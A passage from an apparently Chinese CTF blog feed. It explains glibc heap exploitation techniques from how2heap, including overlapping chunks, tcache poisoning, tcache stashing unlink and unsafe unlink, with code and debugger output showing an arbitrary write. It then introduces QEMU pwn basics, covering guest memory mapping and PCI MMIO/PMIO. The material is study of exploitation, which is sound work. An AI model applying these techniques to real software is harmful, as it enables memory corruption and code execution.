造成堆重叠，然后拿到两个指针指向同一个chunk</p><p>首先分配如下chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620159097/0" alt="image-20210606170537795"></p><p>然后修改 p2 的大小为 p2+p3</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620165603/0" alt="image-20210606170731428"></p><p>然后释放p2</p><p>再分配一个新的大小符合修改之后的 chunk，可以把修改完 chunk 之后的 p2+p3 重新分配回来</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620189326/0" alt="image-20210606171331954"></p><p>可以看到 p4 将 p3 包含进去了</p><h2 id="7-mmap-overlapping-chunks"><a href="#7-mmap-overlapping-chunks" class="headerlink" title="7. mmap_overlapping_chunks"></a>7. mmap_overlapping_chunks</h2><p>在Glibc中，有一个点，当一个分配是如此之大，以至于malloc决定我们需要一个单独的内存部分来处理它，而不是在正常的堆上分配它。这是由于mmap_threshold var. 代替正常的获取块的逻辑，系统调用Mmap。这将分配一段虚拟内存，并把它还给用户。同样，释放的块不是还给bin或堆的其他部分，而是使用另一个syscall。Munmap，它接受一个先前分配的Mmap块的指针，并将其释放回内核。Mmap chunks在大小元数据上有一个特殊的位；第二位，如果这个位被设置，那么这个块就被分配为一个Mmap块。</p><p>Mmap分块有一个prev_size和一个size。大小代表当前的 分块的大小。一个chunk的<em>prev_size</em>表示剩余的空间。的大小（不是直接低于大小的分块）。然而，fd和bk指针并没有被使用，因为Mmap chunks并没有返回到 的大小，就像GLibC Malloc中的大多数堆块一样。释放后， 分块必须是页面对齐的。 下面的POC本质上是一个重叠的chunk攻击，但在mmap chunks上。这和<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c</a> 非常相似。主要的区别是，mmapped chunks有特殊的属性，并且是 以不同的方式处理，创造出与正常情况下不同的攻击场景。重叠的分块攻击。还可以做其他的事情。如munmapping系统库、堆本身和其他东西。 这只是一个简单的概念证明，目的是为了证明一般的 的方法来执行对 mmap 分块的攻击。 关于GLibC中mmap chunks的更多信息，请阅读这篇文章。<a href="http://tukan.farm/2016/07/27/munmap-madness/">http://tukan.farm/2016/07/27/munmap-madness/</a></p><p>首先分配几个大的 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br></pre></td></tr></table></figure><p>此时我们可以知道 mmap_chunk_3 的 prev_size 和 size 分别为 0 和 0x101002</p><p>假设我们有一个漏洞可以修改 size，将其改为 0x202002，然后我们free mmap_chunk_3</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620838707/0" alt="image-20210606205214402"></p><p>这个时候我们再 malloc 一个大小 0x300000 ， 由于前面发生的合并，所以我们会得到一个 重叠的 chunk</p><p>然后我们修改 overlapping_chunk 的数据内容的同时，就是把 mmap_chunk_2 的值修改了</p><h2 id="8-tcache-house-of-spirit"><a href="#8-tcache-house-of-spirit" class="headerlink" title="8. tcache_house_of_spirit"></a>8. tcache_house_of_spirit</h2><p>首先 malloc 一个 chunk，并且在栈上有一个可控目标</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620853329/0" alt="image-20210606205811019"></p><p>将这个可控目标伪造成一个一个chunk ，修改其大小</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620866621/0" alt="image-20210606210254084"></p><p>free 这个伪造的 chunk </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620867677/0" alt="image-20210606210312027"></p><p>此时，我们再malloc 一次，就能把这个栈地址拿回来</p><h2 id="9-tcache-poisoning"><a href="#9-tcache-poisoning" class="headerlink" title="9. tcache_poisoning"></a>9. tcache_poisoning</h2><p>通过劫持修改 tcache fd 的形式来，来获取一个目标地址, 这里的目标是一个栈地址， 作用与 8 挺相似的</p><p>malloc 两个 chunk ，分别为 a 和 b，然后将它们 free </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620878140/0" alt="image-20210606210601763"></p><p>就有如上的链表结构，假设我们可以溢出第一个 chunk，那么们就能修改第二个 chunk 的fd ,则我们将 chunk b 的fd 修改为栈地址,此时 tcachebins 就变成如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620880800/0" alt="image-20210606210703811"></p><p>我们就发现 变成了 b —&gt; &amp;stack_var ,然后我们只需 malloc 两次就能将栈地址拿到</p><h2 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h2><p>tcache 上的 stashing unlink attack</p><p>当你能够覆盖victor-&gt;bk指针时，可以使用这个技术。此外，至少需要用calloc分配一个chunk。</p><p>在glibc中，将smallbin放入tcache的机制给了我们发动攻击的机会. 这种技术允许我们把libc addr写到任何我们想要的地方，并在任何需要的地方创建一个假的chunk。在这种情况下，我们将在堆栈上创建一个假的chunk.</p><p>例如此时我们在栈上伪造一个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620898563/0" alt="image-20210606211334467"></p><p>首先我们向 fake_chunk-&gt;bk 写一个可写的地址，以绕过 glibc 中的 bck-&gt;fd = bin。这里我们选择 stack_var[2] 的地址作为fake bk。之后我们可以看到 *（fake_chunk -&gt;bk + 0x10），也就是 stack_var[4]在攻击后将成为libc addr</p><p>malloc 9 个 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free 7 个 chunk，填满 tcache</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620924124/0" alt="image-20210606212230058"></p><p>这个我们注意一下， tcache bin 的最后一个bin是 chunk_lis[1]</p><p>然后在 unsort bin 里放入两个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620928836/0" alt="image-20210606212338715"></p><p>然后分配一个大于 0x90 的chunk ，这个时候 chunk0 和 chunk2 会被放入 smallbin 里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620930621/0" alt="image-20210606212406868"></p><p>然后，我再 malloc 两个 chunk ，从tcache bin 取出两个 chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620934511/0" alt="image-20210606212505414"></p><p>然后此时，我们假设有一个漏洞能修改 chunklis[2] 的 bck，就是small bin链表头的那个chunk的bk，此时的 bins 如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620945815/0" alt="image-20210606212924738"></p><p>然后我们 calloc 一个新 chunk，此时</p><p>smallbin 的chunk 会被重新填充到 tache bin里，然后我们可以通过 tcache 没有严格的检查，再将 fake chunk 取出</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620956101/0" alt="image-20210606213258292"></p><p>可以看到放入到tcache的首先是我们的 chunklis[2] 然后是我们伪造的bck，接着calloc分配出去的是 chunklis[0]</p><p>通过 calloc 的返回值判断</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13620988157/0" alt="image-20210606214448089"></p><h2 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h2><p>分配两个足够大的 chunk ，free 后不会被放入 fastbin 和tcache （0x420)</p><p>然后我们需要在堆上伪造一个 chunk</p><p>我们设置好 size ， fd ，bk 以</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13621032579/0" alt="image-20210606220237753"></p><p>我们假设我们在chunk0有一个溢出，这样我们就可以自由地改变chunk1的数据</p><p>例如改chunk1的prev_size 和 size</p><p>bypass check</p><p><code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13621044549/0" alt="image-20210606220615560"></p><p>此时我们 free chunk1，因为此时pre_inuse位为0，就会认为前一个chunk为free，此时我们已经伪造了pre_size，此时就会unlink前一个chunk，也就是unlink fake chunk</p><p>最后 我们可以使用chunk0_ptr覆盖自身，另其指向一个任意位置,达到一个任意地址写的目的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ► 54 chunk0_ptr[3] = (uint64_t) victim_string;</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr</span><br><span class="line"><span class="variable">$22</span> = 0x565403b5b008</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[3]</span><br><span class="line"><span class="variable">$23</span> = 0x565403b5b008</span><br><span class="line">pwndbg&gt; x/20gx 0x565403b5b008</span><br><span class="line">0x565403b5b008:0x0000565403b5b0080x00007f8ca43e66a0</span><br><span class="line">0x565403b5b018 &lt;completed&gt;:0x00000000000000000x0000565403b5b008</span><br><span class="line">0x565403b5b028:0x00000000000000000x0000000000000000</span><br><span class="line">─────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────</span><br><span class="line">   54 chunk0_ptr[3] = (uint64_t) victim_string;</span><br><span class="line">   55</span><br><span class="line"> ► 56 <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p/x chunk0_ptr</span><br><span class="line"><span class="variable">$24</span> = 0x7ffe4dfce4d0</span><br><span class="line">pwndbg&gt; p/x chunk0_ptr[3]</span><br><span class="line"><span class="variable">$25</span> = 0x7f8ca42210b3</span><br><span class="line">pwndbg&gt; x/s 0x7ffe4dfce4d0</span><br><span class="line">0x7ffe4dfce4d0:<span class="string">&quot;Hello!~&quot;</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   58 chunk0_ptr[0] = 0x4141414142424242LL;</span><br><span class="line"> ► 59 <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/s 0x7ffe4dfce4d0</span><br><span class="line">0x7ffe4dfce4d0:<span class="string">&quot;BBBBAAAA&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>最终chunk0_ptr指针被改成了fake_chunk的fd</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-fastbin-dup&quot;&gt;&lt;a href=&quot;#1-fastbin-dup&quot; class=&quot;headerlink&quot; title=&quot;1. fastbin_dup&quot;&gt;&lt;/a&gt;1. fastbin_dup&lt;/h2&gt;&lt;p&gt;关于 fastbin attack 在glibc
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>qemu pwn基础</title>
    <link href="https://billyotry.github.io/2021/06/07/qemu%20pwn%E5%9F%BA%E7%A1%80/"/>
    <id>https://billyotry.github.io/2021/06/07/qemu%20pwn%E5%9F%BA%E7%A1%80/</id>
    <published>2021-06-07T12:13:55.028Z</published>
    <updated>2021-06-09T13:47:56.038Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qemu概述"><a href="#qemu概述" class="headerlink" title="qemu概述"></a>qemu概述</h1><p>运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 qemu 进程，而虚拟机的执行线程（如CPU、I/O线程等）对应qemu进程的一个线程。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624747738/0" alt="image-20210607201717970"></p><p>虚拟机所对应的内存结构如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                        Guest&#39; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#39;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p>qemu进程会为虚拟机mmap分配出相应的虚拟机申请大小的内存，用于给虚拟机当作物理内存（在虚拟机进程中只会看到虚拟地址），也就是qemu进程的虚拟地址空间作为了我们虚拟机的物理地址空间。我们以<code>pwn-Blizzard CTF 2017 Strng</code>为例，</p><p>它的启动脚本如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>可以看到<code>qemu</code>虚拟机对应的内存为<code>1G</code>，也就是<code>1G</code>的物理内存，我们启动后查看<code>qemu</code>的地址空间，可以看到存在一个大小为<code>0x40000000</code>的内存空间，即为该虚拟机的物理内存空间，并且当我改成<code>2G</code>的时候，此时为<code>0x80000000</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624816332/0" alt="image-20210607203605134"></p><p>如果我们在qemu虚拟机中申请一段内存空间，该如何在宿主机中找到该内存呢？</p><p>首先将qemu虚拟机中相应的虚拟地址转化为物理地址，该物理地址就是qemu进程为其分配出来的相应偏移，利用该地址加上偏移即是该虚拟地址对应在宿主机中的地址</p><p>在strng虚拟机中运行如下程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="comment">//third</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//second</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//first</span></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr;</span><br><span class="line">    <span class="keyword">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);<span class="comment">//传入我们虚拟机中申请到的虚拟地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>gva_to_gpa</code>即是虚拟机中的虚拟地址转化为物理地址的函数，具体的原理这里就不说了</p><p>由于strng虚拟机是32位的，所以编译命令为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -m32 -O0 mmu.c -o mmu</span><br></pre></td></tr></table></figure><p>使用命令<code>scp -P5555 mmu ubuntu@127.0.0.1:/home/ubuntu</code>将其传至虚拟机中</p><p>最后的结果如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624850287/0" alt="image-20210607204553119"></p><p>从上图我们知道了虚拟机对应的物理内存地址在qemu进程中的地址为<code>0x7f4e03e00000</code>到<code>0x7f4e43e00000</code>，因此相应的字符串地址为<code>0x7f4e03e00000+0x33613008</code>，在gdb中可以得到验证。</p><h1 id="PCI设备地址空间"><a href="#PCI设备地址空间" class="headerlink" title="PCI设备地址空间"></a>PCI设备地址空间</h1><p>PCI设备（如网卡、声卡这些）都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型，设备的总类，设备的性质以及制造商等</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13624996615/0" alt="image-20210607212613013"></p><p>其中比较关键的是6个BAR（Base Address Registers），BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR格式如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13625009727/0" alt="image-20210607213046406"></p><p>设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。当BAR最后一位为0表示这是映射的是I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2为表示内存的类型，bit2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M，bit3表示是否支持可预取。</p><p>而相对于I/O内存，当最后一位为1表示映射的是I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。</p><p>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p><p>通过I/O space访问设备I/O的方式称为port I/O，或者port mmapped I/O，即PMIO，这种情况下CPU需要使用专用的I/O指令如<code>IN/OUT</code>访问I/O端口</p><h2 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h2><p>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p><h2 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h2><p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p><blockquote><p>关于mmio和pmio的区别，个人的理解就是mmio中内存和I/O设备的内存和寄存器共享同一地址空间，就是一段空间中如果某个地址是内存，而不是I/O设备的空间，那么访问这个地址就只能是内存，对于pmio来说就是一个地址可能是内存也可能是I/O设备的空间，具体到底是内存还是I/O设备取决于使用的是普通的访问内存的指令还是专门用于访问I/O设备的指令如<code>IN/OUT</code></p></blockquote><h2 id="qemu中查看pci设备"><a href="#qemu中查看pci设备" class="headerlink" title="qemu中查看pci设备"></a>qemu中查看pci设备</h2><p>依旧通过strng这道题的虚拟机来查看pci设备来增强理解</p><p><code>lspci</code>命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息</p><p>pci设备的寻址是由总线、设备以及功能构成，如下所示：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式</p><p>可以使用lspci命令以树状的形式输出pci结构</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]</span><br><span class="line">           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI</span><br><span class="line">           +-02.0  Device 1234:1111</span><br><span class="line">           +-03.0  Device 1234:11e9</span><br><span class="line">           \-04.0  Intel Corporation 82540EM Gigabit Ethernet Controller</span><br></pre></td></tr></table></figure><p>其中[<code>0000]</code>表示pci的域，PCI域最多可以承载256条总线。每条总线最多可以有32个设备，每个设备最多可以有8个功能。</p><p>总之每个PCI设备有一个总线号，一个设备号，一个功能号标识。PCI规范允许单个系统占用多达256个总线，但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)有最多 8 个功能。</p><p>PCI设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0</span><br><span class="line">Device:00:03.0</span><br><span class="line">Class:00ff</span><br><span class="line">Vendor:1234</span><br><span class="line">Device:11e9</span><br><span class="line">SVendor:1af4</span><br><span class="line">SDevice:1100</span><br><span class="line">PhySlot:3</span><br><span class="line">Rev:10</span><br><span class="line"></span><br><span class="line">Device:00:03.0</span><br><span class="line">Class:Unclassified device [00ff]</span><br><span class="line">Vendor:Vendor 1234</span><br><span class="line">Device:Device 11e9</span><br><span class="line">SVendor:Red Hat, Inc</span><br><span class="line">SDevice:Device 1100</span><br><span class="line">PhySlot:3</span><br><span class="line">Rev:10</span><br></pre></td></tr></table></figure><p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br><span class="line">0000040</span><br></pre></td></tr></table></figure><p>查看设备内存空间</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">Physical Slot: 3</span><br><span class="line">Flags: fast devsel</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>可以看到该设备有两个空间：BARO为MMIO空间，地址为<code>0xfebf1000</code>，大小为256；BAR1为PMIO空间，端口地址为<code>0xc050</code>，大小为8。</p><p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  3 root root    0 Jun  7 13:00 .</span><br><span class="line">drwxr-xr-x 11 root root    0 Jun  7 13:00 ..</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 broken_parity_status</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 class</span><br><span class="line">-rw-r--r--  1 root root  256 Jun  7 13:58 config</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 consistent_dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 d3cold_allowed</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 device</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 enable</span><br><span class="line">lrwxrwxrwx  1 root root    0 Jun  7 14:18 firmware_node -&gt; ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:00 irq</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 local_cpulist</span><br><span 